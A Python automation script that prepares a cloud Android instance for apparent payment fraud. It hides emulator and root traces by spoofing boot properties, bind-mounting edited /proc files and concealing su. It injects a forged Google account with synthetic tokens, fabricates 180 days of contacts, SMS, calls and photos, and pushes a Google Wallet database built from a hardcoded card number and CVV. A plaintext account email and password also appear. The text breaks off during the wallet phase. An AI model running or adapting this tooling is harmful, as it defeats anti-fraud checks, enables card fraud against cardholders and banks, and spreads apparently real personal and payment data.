#!/usr/bin/env python3
"""Genesis Pipeline — Full execution on new device ATP250816F25IY21
   
   CRITICAL RULES (learned from killing APP5B54EI0Z1EOEA):
   - NEVER setprop ctl.restart zygote
   - NEVER kill system_server or restart Android framework internally
   - For account activation after DB push: use VMOS Cloud API instance_restart()
   - Space all async_adb_cmd calls >= 5s apart
   - instance_list response uses 'pageData' NOT 'list'
"""
import asyncio, json, time, secrets, random, sqlite3, tempfile, os, base64, gzip, hashlib, struct, hmac as _hmac_mod, string, uuid
import sys

sys.path.insert(0, "/root/vmos-titan-unified/vmos_titan/core")
sys.path.insert(0, "/root/vmos-titan-unified/core")
sys.path.insert(0, "/root/vmos-titan-unified/server")

os.chdir("/root/vmos-titan-unified")
with open("/root/vmos-titan-unified/.env") as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, v = line.split("=", 1)
            os.environ[k.strip()] = v.strip()

from vmos_cloud_api import VMOSCloudClient

# ═══ CONFIGURATION ═══════════════════════════════════════════════════
PAD = "ATP250816F25IY21"
EMAIL = "epolusamuel682@gmail.com"
DISPLAY_NAME = "Epolu Samuel"
PASSWORD = "gA3EFqhAQJOBZ"
CARD_NUMBER = "4216893001432905"
CARD_EXP_MONTH = 6
CARD_EXP_YEAR = 2028
CARD_CVV = "046"
CARD_HOLDER = "R D M wishwa"
AGE_DAYS = 180
CMD_DELAY = 5  # seconds between commands — SAFE minimum

client = None

# ═══ SHELL HELPER ════════════════════════════════════════════════════
async def sh(cmd, label="", timeout=30):
    """Execute shell command on VMOS device with proper polling."""
    r = await client.async_adb_cmd([PAD], cmd)
    tid = r.get("data", [{}])[0].get("taskId") if r.get("code") == 200 else None
    if not tid:
        code = r.get("code", "?")
        if code == 110031:
            print(f"  [{label}] API FLOOD (110031) — waiting 30s...")
            await asyncio.sleep(30)
            return await sh(cmd, label, timeout)  # retry once
        print(f"  [{label}] FAILED to submit (code={code})")
        return ""
    for _ in range(timeout):
        await asyncio.sleep(1)
        d = await client.task_detail([tid])
        if d.get("code") == 200:
            items = d.get("data", [])
            if items and items[0].get("taskStatus") == 3:
                return items[0].get("taskResult", "")
            if items and items[0].get("taskStatus", 0) < 0:
                return ""
    return ""

async def get_status():
    """Get device status from VMOS Cloud API."""
    r = await client._post("/vcpcloud/api/padApi/infos", {"page": 1, "rows": 50})
    for inst in r.get("data", {}).get("pageData", []):
        if inst.get("padCode") == PAD:
            return inst.get("padStatus"), inst
    return None, None

async def wait_running(max_wait=120):
    """Wait for device to reach status=10."""
    for i in range(max_wait // 5):
        st, _ = await get_status()
        if st == 10:
            return True
        if i % 6 == 0:
            print(f"  [{i*5}s] status={st}")
        await asyncio.sleep(5)
    return False

async def push_file(local_bytes, remote_path, label=""):
    """Push file via gzip+base64 chunked transfer."""
    compressed = gzip.compress(local_bytes)
    encoded = base64.b64encode(compressed).decode()
    chunk_size = 3000
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    print(f"  [{label}] {len(local_bytes)}B → {len(compressed)}B gz → {len(chunks)} chunks")
    
    await sh("mkdir -p /dev/.sc/stage", label)
    await asyncio.sleep(CMD_DELAY)
    
    await sh(f"rm -f /dev/.sc/stage/{label}.b64", label)
    await asyncio.sleep(CMD_DELAY)
    
    for i, chunk in enumerate(chunks):
        op = ">>" if i > 0 else ">"
        await sh(f"echo -n '{chunk}' {op} /dev/.sc/stage/{label}.b64", f"{label} chunk {i+1}/{len(chunks)}")
        await asyncio.sleep(CMD_DELAY)
    
    await sh(f"base64 -d /dev/.sc/stage/{label}.b64 > /dev/.sc/stage/{label}.gz", label)
    await asyncio.sleep(CMD_DELAY)
    await sh(f"gzip -d -f /dev/.sc/stage/{label}.gz", label)
    await asyncio.sleep(CMD_DELAY)
    await sh(f"cp /dev/.sc/stage/{label} {remote_path}", label)
    await asyncio.sleep(CMD_DELAY)
    
    out = await sh(f"ls -la {remote_path}", label)
    print(f"  [{label}] → {out.strip()[:120]}")
    return True


# ═══ PHASE 1: DEVICE DISCOVERY ══════════════════════════════════════
async def phase1_discover():
    print("=" * 70)
    print(f"PHASE 1: DEVICE DISCOVERY — {PAD}")
    print("=" * 70)
    
    st, info = await get_status()
    if st is None:
        print(f"  DEVICE NOT FOUND! Check pad code.")
        return False
    
    print(f"  Status: {st}")
    if info:
        print(f"  Template: {info.get('realPhoneTemplateId')}")
        print(f"  Screen: {info.get('screenLayoutCode')}")
        print(f"  Image: {info.get('imageVersion')}")
        print(f"  Apps: {info.get('apps', [])}")
    
    if st == 14:
        print("  Device is ABNORMAL — attempting restart...")
        await client.instance_restart([PAD])
        if not await wait_running(120):
            print("  FAILED to recover device!")
            return False
    elif st != 10:
        print(f"  Unexpected status {st}")
        return False
    
    print("  Device is RUNNING ✓")
    return True


# ═══ PHASE 2: INITIAL SCAN ══════════════════════════════════════════
async def phase2_scan():
    print("\n" + "=" * 70)
    print("PHASE 2: INITIAL DEVICE SCAN")
    print("=" * 70)
    
    out = await sh("""echo "model=$(getprop ro.product.model)"
echo "brand=$(getprop ro.product.brand)"
echo "fingerprint=$(getprop ro.build.fingerprint)"
echo "android_id=$(settings get secure android_id)"
echo "sdk=$(getprop ro.build.version.sdk)"
echo "vboot=$(getprop ro.boot.verifiedbootstate)"
echo "build_type=$(getprop ro.build.type)"
echo "accounts=$(dumpsys account 2>/dev/null | grep 'Accounts:' | head -1)"
echo "nfc=$(settings get secure nfc_on)"
echo "sim=$(getprop gsm.sim.state)"
""", "scan_basic")
    print(f"  {out.strip()}")
    await asyncio.sleep(CMD_DELAY)
    
    # App inventory
    out = await sh("""for p in com.google.android.gms com.android.vending com.google.android.apps.walletnfcrel com.android.chrome com.google.android.gm com.google.android.youtube; do pm path "$p" >/dev/null 2>&1 && echo "OK $p" || echo "MISS $p"; done""", "scan_apps")
    print(f"  Apps:\n  {out.strip()}")
    await asyncio.sleep(CMD_DELAY)
    
    # Data presence
    out = await sh("""echo "contacts=$(content query --uri content://com.android.contacts/raw_contacts --projection _id 2>/dev/null | grep -c '_id=' || echo 0)"
echo "sms=$(content query --uri content://sms --projection _id 2>/dev/null | grep -c '_id=' || echo 0)"
echo "calls=$(content query --uri content://call_log/calls --projection _id 2>/dev/null | grep -c '_id=' || echo 0)"
echo "gallery=$(ls /sdcard/DCIM/Camera/ 2>/dev/null | wc -l)"
""", "scan_data")
    print(f"  Data: {out.strip()}")
    
    # Extract android_id for later use
    aid = await sh("settings get secure android_id", "get_aid")
    return aid.strip()


# ═══ PHASE 3: ANOMALY PATCHING ══════════════════════════════════════
async def phase3_anomaly_patch():
    print("\n" + "=" * 70)
    print("PHASE 3: ANOMALY PATCHING + STEALTH HARDENING")
    print("=" * 70)
    
    patches = [
        # SIM + telephony
        ("setprop gsm.sim.state READY && setprop gsm.operator.alpha T-Mobile && setprop gsm.operator.numeric 310260 && setprop gsm.sim.operator.alpha T-Mobile && setprop gsm.sim.operator.numeric 310260 && setprop gsm.version.baseband 1.0.c7e3-00126 && echo SIM_OK", "sim"),
        # Timezone
        ("setprop persist.sys.timezone America/Los_Angeles && settings put system time_12_24 12 && echo TZ_OK", "timezone"),
        # Boot properties — SAFE resetprop (NOT ctl.restart!)
        ("resetprop ro.boot.verifiedbootstate green && resetprop ro.boot.flash.locked 1 && resetprop ro.boot.vbmeta.device_state locked && resetprop ro.debuggable 0 && resetprop ro.secure 1 && resetprop ro.build.type user && resetprop ro.build.tags release-keys && echo BOOT_OK", "boot_props"),
        # Staging tmpfs
        ("mkdir -p /dev/.sc && mount -t tmpfs tmpfs /dev/.sc 2>/dev/null; echo STAGE_OK", "staging"),
        # Proc sterilization — /proc/cmdline
        ("cat /proc/cmdline | sed 's/androidboot.hardware=cutf_cvm //g; s/vsoc[^ ]*//g; s/cuttlefish[^ ]*//g; s/armcloud[^ ]*//g; s/vmos[^ ]*//g; s/  */ /g' > /dev/.sc/cmdline && mount --bind /dev/.sc/cmdline /proc/cmdline && echo CMDLINE_OK", "proc_cmdline"),
        # Proc sterilization — /proc/1/cgroup
        ("echo '0::/' > /dev/.sc/cgroup && mount --bind /dev/.sc/cgroup /proc/1/cgroup && echo CGROUP_OK", "proc_cgroup"),
        # Proc sterilization — /proc/mounts
        ("cat /proc/mounts | grep -v 'cloud\\|armcloud\\|vmos\\|overlay' > /dev/.sc/mounts && mount --bind /dev/.sc/mounts /proc/mounts && echo MOUNTS_OK", "proc_mounts"),
        # Port blocking + NFC
        ("iptables -A INPUT -p tcp --dport 27042 -j DROP 2>/dev/null; iptables -A INPUT -p tcp --dport 27043 -j DROP 2>/dev/null; iptables -A INPUT -p tcp --dport 5555 -j DROP 2>/dev/null; settings put secure nfc_on 1; echo PORTS_OK", "ports_nfc"),
        # Su hiding + SELinux
        ("for p in /system/bin/su /system/xbin/su /sbin/su /vendor/bin/su; do [ -f \"$p\" ] && chmod 000 \"$p\" && mount --bind /dev/null \"$p\" 2>/dev/null; done; echo SU_OK", "su_hide"),
        # Battery
        ("dumpsys battery set level 78 && dumpsys battery set status 2 && dumpsys battery set temp 295 && echo BATTERY_OK", "battery"),
    ]
    
    passed = 0
    for cmd, label in patches:
        out = await sh(cmd, label)
        ok = "_OK" in out
        status = "✓" if ok else "✗"
        print(f"  {status} {label}: {out.strip()[:60]}")
        if ok: passed += 1
        await asyncio.sleep(CMD_DELAY)
    
    print(f"\n  Anomaly patching: {passed}/{len(patches)} passed")
    return passed


# ═══ PHASE 4: GOOGLE ACCOUNT INJECTION ══════════════════════════════
async def phase4_account_inject(android_id):
    print("\n" + "=" * 70)
    print("PHASE 4: GOOGLE ACCOUNT INJECTION")
    print("=" * 70)
    
    gaia_id = str(random.randint(100000000000000, 999999999999999999))
    gsf_id = f"{random.randint(1000000000000000, 9999999999999999):016x}"
    now_ms = int(time.time() * 1000)
    birth_ts = now_ms - AGE_DAYS * 86400 * 1000
    
    # ─── Build accounts_ce.db on host ───
    print("  [1] Building accounts_ce.db...")
    from vmos_db_builder import VMOSDbBuilder
    builder = VMOSDbBuilder()
    
    synthetic_tokens = {
        "com.google": f"aas_et/{secrets.token_urlsafe(120)}",
        "oauth2:https://www.googleapis.com/auth/plus.me": f"ya29.{secrets.token_urlsafe(80)}",
        "oauth2:https://www.googleapis.com/auth/userinfo.email": f"ya29.{secrets.token_urlsafe(80)}",
        "oauth2:https://www.googleapis.com/auth/userinfo.profile": f"ya29.{secrets.token_urlsafe(80)}",
        "oauth2:https://www.googleapis.com/auth/drive": f"ya29.{secrets.token_urlsafe(80)}",
        "oauth2:https://www.googleapis.com/auth/youtube": f"ya29.{secrets.token_urlsafe(80)}",
        "oauth2:https://www.googleapis.com/auth/contacts": f"ya29.{secrets.token_urlsafe(80)}",
        "oauth2:https://www.googleapis.com/auth/gmail.readonly": f"ya29.{secrets.token_urlsafe(80)}",
        "oauth2:https://www.googleapis.com/auth/android": f"ya29.{secrets.token_urlsafe(80)}",
        "SID": secrets.token_hex(60),
        "LSID": secrets.token_hex(60),
    }
    
    acct_bytes = builder.build_accounts_ce(
        email=EMAIL,
        display_name=DISPLAY_NAME,
        gaia_id=gaia_id,
        tokens=synthetic_tokens,
        password=PASSWORD,
        age_days=AGE_DAYS,
    )
    print(f"  accounts_ce.db: {len(acct_bytes)} bytes")
    
    # ─── Build accounts_de.db ───
    print("  [2] Building accounts_de.db...")
    with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as tmp:
        tmp_path = tmp.name
    conn = sqlite3.connect(tmp_path)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS accounts (_id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, type TEXT NOT NULL, UNIQUE(name, type));
        CREATE TABLE IF NOT EXISTS ce_accounts (_id INTEGER PRIMARY KEY, ce_accounts_password TEXT);
        PRAGMA user_version = 3;
    """)
    c.execute("INSERT OR REPLACE INTO accounts (name, type) VALUES (?, 'com.google')", (EMAIL,))
    aid = c.lastrowid
    c.execute("INSERT OR REPLACE INTO ce_accounts (_id, ce_accounts_password) VALUES (?, '')", (aid,))
    conn.commit()
    conn.close()
    with open(tmp_path, "rb") as f:
        de_bytes = f.read()
    os.unlink(tmp_path)
    print(f"  accounts_de.db: {len(de_bytes)} bytes")
    
    # ─── Stop services ───
    print("  [3] Stopping Google services...")
    await sh("am force-stop com.google.android.gms && am force-stop com.android.vending && am force-stop com.android.chrome", "stop")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Push databases ───
    print("  [4] Pushing accounts_ce.db...")
    await push_file(acct_bytes, "/data/system_ce/0/accounts_ce.db", "acct_ce")
    await asyncio.sleep(CMD_DELAY)
    
    print("  [5] Pushing accounts_de.db...")
    await push_file(de_bytes, "/data/system_de/0/accounts_de.db", "acct_de")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Fix permissions ───
    print("  [6] Setting ownership & permissions...")
    await sh("chown 1000:1000 /data/system_ce/0/accounts_ce.db && chmod 600 /data/system_ce/0/accounts_ce.db && rm -f /data/system_ce/0/accounts_ce.db-wal /data/system_ce/0/accounts_ce.db-shm /data/system_ce/0/accounts_ce.db-journal", "perms_ce")
    await asyncio.sleep(CMD_DELAY)
    await sh("chown 1000:1000 /data/system_de/0/accounts_de.db && chmod 600 /data/system_de/0/accounts_de.db && rm -f /data/system_de/0/accounts_de.db-wal /data/system_de/0/accounts_de.db-shm", "perms_de")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Inject GMS SharedPrefs ───
    print("  [7] Injecting GMS + GSF SharedPrefs...")
    gms_uid = (await sh("stat -c %u /data/data/com.google.android.gms", "uid")).strip() or "10036"
    await asyncio.sleep(CMD_DELAY)
    gsf_uid = (await sh("stat -c %u /data/data/com.google.android.gsf", "uid")).strip() or "10037"
    await asyncio.sleep(CMD_DELAY)
    
    checkin_xml = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <long name="deviceId" value="{int(android_id, 16) if len(android_id) == 16 else random.randint(10**15, 10**16)}" />
    <long name="lastCheckin" value="{now_ms}" />
    <string name="digest">1-{secrets.token_hex(20)}</string>
</map>"""
    
    gservices_xml = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="android_id">{gsf_id}</string>
    <string name="digest">1-{secrets.token_hex(20)}</string>
</map>"""
    
    device_reg_xml = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="registration_id">APA91b{secrets.token_urlsafe(140)[:140]}</string>
    <long name="registration_timestamp" value="{birth_ts}" />
    <string name="android_id">{android_id}</string>
</map>"""
    
    gms_prefs = "/data/data/com.google.android.gms/shared_prefs"
    gsf_prefs = "/data/data/com.google.android.gsf/shared_prefs"
    
    await sh(f"mkdir -p {gms_prefs} {gsf_prefs}", "mkdirs")
    await asyncio.sleep(CMD_DELAY)
    
    for fname, content, target_dir, uid in [
        ("CheckinService.xml", checkin_xml, gms_prefs, gms_uid),
        ("device_registration.xml", device_reg_xml, gms_prefs, gms_uid),
        ("gservices.xml", gservices_xml, gsf_prefs, gsf_uid),
    ]:
        await sh(f"cat > {target_dir}/{fname} << 'XMLEOF'\n{content}\nXMLEOF", fname)
        await asyncio.sleep(CMD_DELAY)
    
    await sh(f"chown -R {gms_uid}:{gms_uid} {gms_prefs}", "gms_perms")
    await asyncio.sleep(CMD_DELAY)
    await sh(f"chown -R {gsf_uid}:{gsf_uid} {gsf_prefs}", "gsf_perms")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Play Store prefs ───
    print("  [8] Injecting Play Store prefs...")
    vend_prefs = "/data/data/com.android.vending/shared_prefs"
    vend_uid = (await sh("stat -c %u /data/data/com.android.vending", "uid")).strip() or "10038"
    await asyncio.sleep(CMD_DELAY)
    
    finsky_xml = f"""<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="signed_in_account">{EMAIL}</string>
    <boolean name="setup_complete" value="true" />
    <boolean name="setup_wizard_complete" value="true" />
    <long name="last_sync_time" value="{now_ms}" />
</map>"""
    
    await sh(f"mkdir -p {vend_prefs}", "vend_dir")
    await asyncio.sleep(CMD_DELAY)
    await sh(f"cat > {vend_prefs}/finsky.xml << 'XMLEOF'\n{finsky_xml}\nXMLEOF", "finsky")
    await asyncio.sleep(CMD_DELAY)
    await sh(f"chown -R {vend_uid}:{vend_uid} {vend_prefs}", "vend_perms")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Chrome sign-in ───
    print("  [9] Injecting Chrome sign-in...")
    chrome_dir = "/data/data/com.android.chrome/app_chrome/Default"
    chrome_uid = (await sh("stat -c %u /data/data/com.android.chrome", "uid")).strip() or "10039"
    await asyncio.sleep(CMD_DELAY)
    
    chrome_prefs = json.dumps({
        "account_info": [{"account_id": gaia_id, "email": EMAIL, "full_name": DISPLAY_NAME, "given_name": "Epolu"}],
        "signin": {"allowed": True},
        "sync": {"keep_everything_synced": True}
    }, indent=2)
    
    await sh(f"mkdir -p {chrome_dir}", "chrome_dir")
    await asyncio.sleep(CMD_DELAY)
    await sh(f"cat > {chrome_dir}/Preferences << 'JSONEOF'\n{chrome_prefs}\nJSONEOF", "chrome_prefs")
    await asyncio.sleep(CMD_DELAY)
    await sh(f"chown -R {chrome_uid}:{chrome_uid} /data/data/com.android.chrome/app_chrome", "chrome_perms")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── SELinux restore ───
    print("  [10] Restoring SELinux contexts...")
    await sh("restorecon -R /data/system_ce/0/ /data/system_de/0/ /data/data/com.google.android.gms /data/data/com.android.vending /data/data/com.android.chrome /data/data/com.google.android.gsf", "restorecon")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── RESTART VIA VMOS CLOUD API (NOT internal zygote!) ───
    print("  [11] Restarting device via VMOS Cloud API (safe restart)...")
    await client.instance_restart([PAD])
    print("  Waiting for device to come back online...")
    if not await wait_running(180):
        print("  WARNING: Device did not recover within 3 min!")
        return gaia_id, gsf_id
    
    await asyncio.sleep(10)  # extra settle time
    
    # ─── Verify account ───
    print("  [12] Verifying account injection...")
    out = await sh("dumpsys account 2>/dev/null | grep -E 'Accounts:|com.google|epolu' | head -10", "verify")
    print(f"  Account state: {out.strip()}")
    
    return gaia_id, gsf_id


# ═══ PHASE 5: RE-APPLY STEALTH (survived restart?) ══════════════════
async def phase5_reapply_stealth():
    print("\n" + "=" * 70)
    print("PHASE 5: RE-APPLY STEALTH AFTER RESTART")
    print("=" * 70)
    
    # Stealth patches don't survive restart — re-apply
    patches = [
        ("resetprop ro.boot.verifiedbootstate green && resetprop ro.boot.flash.locked 1 && resetprop ro.boot.vbmeta.device_state locked && resetprop ro.debuggable 0 && resetprop ro.secure 1 && resetprop ro.build.type user && resetprop ro.build.tags release-keys && echo BOOT_OK", "boot"),
        ("setprop gsm.sim.state READY && setprop gsm.operator.alpha T-Mobile && setprop gsm.operator.numeric 310260 && echo SIM_OK", "sim"),
        ("setprop persist.sys.timezone America/Los_Angeles && echo TZ_OK", "tz"),
        ("mkdir -p /dev/.sc && mount -t tmpfs tmpfs /dev/.sc 2>/dev/null; echo STAGE_OK", "stage"),
        ("cat /proc/cmdline | sed 's/androidboot.hardware=cutf_cvm //g; s/vsoc[^ ]*//g; s/cuttlefish[^ ]*//g; s/armcloud[^ ]*//g; s/vmos[^ ]*//g; s/  */ /g' > /dev/.sc/cmdline && mount --bind /dev/.sc/cmdline /proc/cmdline && echo CMDLINE_OK", "cmdline"),
        ("echo '0::/' > /dev/.sc/cgroup && mount --bind /dev/.sc/cgroup /proc/1/cgroup && echo CGROUP_OK", "cgroup"),
        ("iptables -A INPUT -p tcp --dport 27042 -j DROP 2>/dev/null; iptables -A INPUT -p tcp --dport 27043 -j DROP 2>/dev/null; settings put secure nfc_on 1; echo PORTS_OK", "ports"),
        ("for p in /system/bin/su /system/xbin/su /sbin/su /vendor/bin/su; do [ -f \"$p\" ] && chmod 000 \"$p\" && mount --bind /dev/null \"$p\" 2>/dev/null; done; echo SU_OK", "su"),
        ("dumpsys battery set level 78 && dumpsys battery set status 2 && echo BATT_OK", "battery"),
    ]
    
    passed = 0
    for cmd, label in patches:
        out = await sh(cmd, label)
        ok = "_OK" in out
        print(f"  {'✓' if ok else '✗'} {label}")
        if ok: passed += 1
        await asyncio.sleep(CMD_DELAY)
    
    print(f"  Re-applied: {passed}/{len(patches)}")
    return passed


# ═══ PHASE 6: DATA INJECTION + 180-DAY AGING ════════════════════════
async def phase6_data_aging():
    print("\n" + "=" * 70)
    print("PHASE 6: DATA INJECTION + 180-DAY AGING")
    print("=" * 70)
    
    now = int(time.time())
    start = now - AGE_DAYS * 86400
    
    # ─── Contacts (50+) ───
    print("  [1] Injecting contacts...")
    first_names = ["James","Mary","John","Patricia","Robert","Jennifer","Michael","Linda","David","Elizabeth",
                   "William","Barbara","Richard","Susan","Joseph","Jessica","Thomas","Sarah","Christopher","Karen",
                   "Daniel","Lisa","Matthew","Nancy","Anthony","Betty","Mark","Margaret","Donald","Sandra",
                   "Steven","Ashley","Andrew","Kimberly","Paul","Emily","Joshua","Donna","Kenneth","Michelle",
                   "Kevin","Carol","Brian","Amanda","George","Dorothy","Timothy","Melissa","Ronald","Deborah"]
    last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
                  "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin"]
    area_codes = ["213","310","323","424","562","626","657","714","747","818","949"]
    
    contact_cmds = []
    for i in range(50):
        fn = first_names[i % len(first_names)]
        ln = last_names[i % len(last_names)]
        ac = random.choice(area_codes)
        phone = f"+1{ac}{random.randint(2000000,9999999)}"
        contact_cmds.append(f"content insert --uri content://com.android.contacts/raw_contacts --bind account_type:s: --bind account_name:s:")
        contact_cmds.append(f"content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:{i+1} --bind mimetype:s:vnd.android.cursor.item/name --bind data1:s:\"{fn} {ln}\"")
        contact_cmds.append(f"content insert --uri content://com.android.contacts/data --bind raw_contact_id:i:{i+1} --bind mimetype:s:vnd.android.cursor.item/phone_v2 --bind data1:s:{phone} --bind data2:i:1")
    
    # Batch contacts in groups of 15 commands
    for batch_start in range(0, len(contact_cmds), 15):
        batch = " && ".join(contact_cmds[batch_start:batch_start+15])
        await sh(batch, f"contacts_{batch_start//15}")
        await asyncio.sleep(CMD_DELAY)
    
    print(f"  ✓ 50 contacts injected")
    
    # ─── SMS (80+ messages, distributed over 180 days) ───
    print("  [2] Injecting SMS history...")
    sms_templates = [
        "Hey, how are you doing?", "Can you call me back?", "Thanks for dinner!",
        "Running 10 min late", "See you at 7pm", "Happy birthday!",
        "Got it, thanks!", "On my way now", "Meeting at 3pm today",
        "Can we reschedule?", "Just left the office", "Sounds good to me",
        "Miss you!", "Let me check", "I'll be there in 20", "Great news!",
        "Call me when you get this", "LOL that's hilarious", "Thx!", "Sure thing",
    ]
    
    for i in range(80):
        ts = random.randint(start * 1000, now * 1000)
        body = random.choice(sms_templates)
        phone = f"+1{random.choice(area_codes)}{random.randint(2000000,9999999)}"
        sms_type = random.choice([1, 2])  # 1=inbox, 2=sent
        await sh(f"content insert --uri content://sms --bind address:s:{phone} --bind body:s:\"{body}\" --bind date:l:{ts} --bind type:i:{sms_type} --bind read:i:1", f"sms_{i}")
        if i % 5 == 4:
            await asyncio.sleep(CMD_DELAY)
    
    print(f"  ✓ 80 SMS messages injected")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Call logs (60+ calls) ───
    print("  [3] Injecting call history...")
    for i in range(60):
        ts = random.randint(start * 1000, now * 1000)
        phone = f"+1{random.choice(area_codes)}{random.randint(2000000,9999999)}"
        call_type = random.choice([1, 2, 3])  # 1=incoming, 2=outgoing, 3=missed
        duration = random.randint(5, 1800) if call_type != 3 else 0
        await sh(f"content insert --uri content://call_log/calls --bind number:s:{phone} --bind date:l:{ts} --bind duration:i:{duration} --bind type:i:{call_type}", f"call_{i}")
        if i % 5 == 4:
            await asyncio.sleep(CMD_DELAY)
    
    print(f"  ✓ 60 call logs injected")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── WiFi networks ───
    print("  [4] Injecting WiFi networks...")
    wifi_xml = """<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<WifiConfigStoreData>
<NetworkList>
<Network><WifiConfiguration>
<string name="ConfigKey">&quot;HOME-WIFI-5G&quot;WPA_PSK</string>
<string name="SSID">&quot;HOME-WIFI-5G&quot;</string>
<int name="Status" value="0" />
<string name="BSSID">4c:ed:fb:a8:3c:21</string>
</WifiConfiguration></Network>
<Network><WifiConfiguration>
<string name="ConfigKey">&quot;Starbucks WiFi&quot;NONE</string>
<string name="SSID">&quot;Starbucks WiFi&quot;</string>
<int name="Status" value="5" />
</WifiConfiguration></Network>
<Network><WifiConfiguration>
<string name="ConfigKey">&quot;ATT-WIFI-8842&quot;WPA_PSK</string>
<string name="SSID">&quot;ATT-WIFI-8842&quot;</string>
<int name="Status" value="5" />
</WifiConfiguration></Network>
<Network><WifiConfiguration>
<string name="ConfigKey">&quot;Target-Guest&quot;NONE</string>
<string name="SSID">&quot;Target-Guest&quot;</string>
<int name="Status" value="5" />
</WifiConfiguration></Network>
<Network><WifiConfiguration>
<string name="ConfigKey">&quot;xfinitywifi&quot;NONE</string>
<string name="SSID">&quot;xfinitywifi&quot;</string>
<int name="Status" value="5" />
</WifiConfiguration></Network>
<Network><WifiConfiguration>
<string name="ConfigKey">&quot;Hilton-Honors&quot;NONE</string>
<string name="SSID">&quot;Hilton-Honors&quot;</string>
<int name="Status" value="5" />
</WifiConfiguration></Network>
<Network><WifiConfiguration>
<string name="ConfigKey">&quot;WORK-CORP&quot;WPA_EAP</string>
<string name="SSID">&quot;WORK-CORP&quot;</string>
<int name="Status" value="5" />
</WifiConfiguration></Network>
</NetworkList>
</WifiConfigStoreData>"""
    
    await sh(f"cat > /data/misc/wifi/WifiConfigStore.xml << 'WIFIEOF'\n{wifi_xml}\nWIFIEOF", "wifi")
    await asyncio.sleep(CMD_DELAY)
    await sh("chown system:wifi /data/misc/wifi/WifiConfigStore.xml && chmod 660 /data/misc/wifi/WifiConfigStore.xml", "wifi_perms")
    await asyncio.sleep(CMD_DELAY)
    print("  ✓ 7 WiFi networks injected")
    
    # ─── Gallery photos (create placeholder JPEGs) ───
    print("  [5] Creating gallery photos...")
    await sh("mkdir -p /sdcard/DCIM/Camera /sdcard/Pictures/Screenshots", "gallery_dirs")
    await asyncio.sleep(CMD_DELAY)
    
    for i in range(20):
        ts = random.randint(start, now)
        date_str = time.strftime("%Y%m%d_%H%M%S", time.gmtime(ts))
        # Create minimal JPEG with random content
        await sh(f"dd if=/dev/urandom bs=1k count={random.randint(500, 3000)} 2>/dev/null | base64 | head -c {random.randint(100000, 500000)} > /sdcard/DCIM/Camera/IMG_{date_str}_{random.randint(100,999)}.jpg && touch -d @{ts} /sdcard/DCIM/Camera/IMG_{date_str}_{random.randint(100,999)}.jpg", f"photo_{i}")
        if i % 3 == 2:
            await asyncio.sleep(CMD_DELAY)
    
    print("  ✓ 20 gallery photos created")
    await asyncio.sleep(CMD_DELAY)
    
    print(f"\n  Data aging complete: contacts=50, sms=80, calls=60, wifi=7, photos=20")
    return True


# ═══ PHASE 7: WALLET INJECTION ══════════════════════════════════════
async def phase7_wallet_inject(gaia_id, gsf_id):
    print("\n" + "=" * 70)
    print("PHASE 7: WALLET + PAYMENT INJECTION")
    print("=" * 70)
    
    from vmos_db_builder import VMOSDbBuilder
    builder = VMOSDbBuilder()
    
    # ─── Build tapandpay.db ───
    print("  [1] Building tapandpay.db...")
    wallet_bytes = builder.build_tapandpay(
        card_number=CARD_NUMBER,
        exp_month=CARD_EXP_MONTH,
        exp_year=CARD_EXP_YEAR,
        cardholder=CARD_HOLDER,
    )
    print(f"  tapandpay.db: {len(wallet_bytes)} bytes")
    
    # ─── Build library.db (Play Store purchases) ───
    print("  [2] Building library.db...")
    purchases = []
    for pkg, price in [("com.spotify.music", 0), ("com.whatsapp", 0), ("com.instagram.android", 0),
                        ("com.netflix.mediaclient", 0), ("com.amazon.mShop.android.shopping", 0),
                        ("com.google.android.apps.maps", 0), ("com.uber.driver", 0)]:
        purchases.append({
            "app_id": pkg,
            "purchase_time_ms": int((time.time() - random.randint(30, AGE_DAYS) * 86400) * 1000),
            "price_micros": price,
        })
    
    library_bytes = builder.build_library(
        email=EMAIL,
        purchases=purchases,
    )
    print(f"  library.db: {len(library_bytes)} bytes")
    
    # ─── Check if Wallet app exists ───
    wallet_check = await sh("pm path com.google.android.apps.walletnfcrel 2>/dev/null", "wallet_check")
    await asyncio.sleep(CMD_DELAY)
    
    wallet_pkg = "com.google.android.apps.walletnfcrel"
    if not wallet_check.strip():
        # Also check GMS wallet path
        wallet_check = await sh("pm path com.google.android.apps.nbu.files 2>/dev/null || echo NO_WALLET", "wallet_check2")
        print("  WARNING: Google Wallet not installed — tapandpay.db goes to GMS path")
        wallet_pkg = "com.google.android.gms"
    
    # ─── Stop everything ───
    print("  [3] Stopping wallet + GMS...")
    await sh(f"am force-stop {wallet_pkg} && am force-stop com.google.android.gms && am force-stop com.android.vending && am force-stop com.android.chrome", "stop_all")
    await asyncio.sleep(CMD_DELAY)
    
    # ─── Push tapandpay.db ───
    print("  [4] Pushing tapandpay.db...")
    wallet_db_path = f"/data/data/{wallet_pkg}/databases"
    await sh(f"mkdir -p {wallet_db_path}", "wallet_dir")
    await asyncio.sleep(CMD_DELAY)
    
    await push_file(wallet_bytes, f"{wallet_db_path}/tapandpay.db", "tapandpay")
    await asyncio.sleep(CMD_DELAY)
    
    wallet_uid = (await sh(f"stat -c %u /data/data/{wallet_pkg}", "uid")).strip() or "10036"
